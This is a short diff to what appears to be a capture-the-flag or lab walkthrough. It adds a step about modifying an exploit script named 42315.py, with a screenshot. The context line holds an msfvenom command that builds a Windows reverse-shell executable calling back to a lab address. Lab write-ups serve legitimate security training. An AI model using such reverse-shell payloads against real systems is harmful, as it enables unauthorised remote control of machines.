@@ -209,6 +209,10 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 -f exe > rever
 
 
 8. Great we're allowed then.
+9. Now let's do few changes for 42315.py
+
+![image](https://user-images.githubusercontent.com/70703371/210558184-96b90145-7683-4579-aac2-1fe0ac845d17.png)
+
 
 
 
